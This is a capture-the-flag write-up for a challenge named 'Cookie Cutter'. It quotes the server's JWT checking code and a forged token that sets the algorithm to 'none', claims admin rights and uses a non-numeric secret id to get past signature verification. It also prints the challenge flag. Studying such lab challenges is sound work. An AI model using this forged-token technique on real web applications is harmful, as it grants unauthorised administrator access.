<h1>Cookie Cutter</h1>

<p>The chalange is about hacking the JWT cookie. 
To get the flag we have to pass this check:
<code>javascript
let sid = JSON.parse(Buffer.from(cookie.split(".")[1], 'base64').toString()).secretid;
if(sid==undefined||sid&gt;=secrets.length||sid&lt;0){throw "invalid sid"}
let decoded = jwt.verify(cookie, secrets[sid]);
if(decoded.perms=="admin"){
    res.locals.flag = true;
}
</code>
where the <code>secrets</code> is an array containing randomly generated <code>secrets</code></p>

<p><code>javascript
let secret = crypto.randomBytes(32)
cookie = jwt.sign({perms:"user",secretid:secrets.length,rolled:res.locals.rolled?"yes":"no"}, secret, {algorithm: "HS256"});
secrets.push(secret);
</code></p>

<p>The cookie looks like:
<code>json
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "perms": "user",
  "secretid": 1394,
  "rolled": "no",
  "iat": 1555925889
}
</code></p>

<p>By providing the cookie: <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJwZXJtcyI6ImFkbWluIiwic2VjcmV0aWQiOiJyYW5kb21zdHIiLCJyb2xsZWQiOiJubyJ9.</code> which after decoding looks like</p>

<p><code>json
{
  "typ": "JWT",
  "alg": "none"
}
{
  "perms": "admin",
  "secretid": "randomstr",
  "rolled": "no"
}
</code></p>

<p>we will get the flag, becasue <code>secrets["randomstr"]</code> will return <code>undefined</code> and we set the <code>algorithm</code> to <code>none</code>.</p>

<p>The flag is: <strong>actf{defund<em>ate</em>the<em>cookies</em>and<em>left</em>no_sign}</strong></p>
